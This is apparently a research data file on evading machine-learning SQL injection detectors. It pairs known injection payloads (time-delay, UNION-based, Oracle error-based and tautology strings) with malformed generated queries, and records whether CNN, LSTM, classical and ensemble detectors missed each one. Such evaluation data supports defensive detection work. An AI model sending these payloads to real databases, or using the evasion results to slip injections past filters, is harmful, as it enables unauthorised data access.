original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
1'  )   waitfor delay '0:0:5' and   (  'fpnh'  =  'fpnh,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1""  )   union all select null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#","SELECT MIN(USER()) FROM SQL, SELECT SELECT MIN(USER()) FROM SQL JOIN SELECT SELECT MIN(USER()) FROM SQL JOIN SELECT BENCHMARK(1000000)",1,1,0,0,1,0,0
INSERT INTO Documents WHERE ID=x,SELECT SQL FROM Documents WHERE ID = 'Excel',1,0,1,1,1,1,1
1 and   (  1977  =  6852  )  *6852-- clxl,"SELECT *6852-- clxl FROM query: 1 AND NOT SQL_inject = ""valid""",1,1,1,0,1,1,0
"1""   )    )    as gqxk where 9199  =  9199 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",SELECT MIN(sqxk) FROM SQL SELECT MIN(sqxk) FROM SQL JOIN 9199 AND 3754 = '3754 = '(select upper ( xmltype) ||chr ( 113 )||chr ( 62 )),0,1,0,0,0,0,0
"-9171  )   union all select 6880,6880,6880,6880,6880,6880,6880#","SELECT 6880,6880,6880,6880,6880 FROM SQL injection_description WHERE NOT 6880,6880,6880,6880,6880,6880# ='sql injection detection' AND NOT 6880,6880,6880,6880,6880,6880# ='sql injection detection'",1,1,1,1,0,1,0
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,1,0,0
1 where 4641  =  4641,SELECT * FROM query: 1 WHERE NOT SQL_injection = 4641,1,0,1,1,1,1,1
select * from users where id  =  1 or $<\ or 1  =  1 -- 1,SELECT * FROM * FROM * FROM users WHERE id = 1 OR $ OR 1 = 1,1,1,1,0,1,1,0
"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'zurf'  =  'zurf","SELECT MIN(5000000,md5) FROM SQL & 'zurf' FROM SQL SELECT SELECT DISTINCT esq_injection' FROM SQL SELECT MIN(5000000,md5 ( 0x76555642 ) & ((() = 'zurf') FROM SQL injection')",1,1,0,0,1,0,0
"1""  )   where 1144  =  1144 and 2006  =  2006",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
1'   )    )    and 6690  =  3250#,SELECT MIN(#3) FROM SQL injection detection WHERE NOT SELECT MIN(#3) FROM SQL injection detection,1,1,1,1,1,1,1
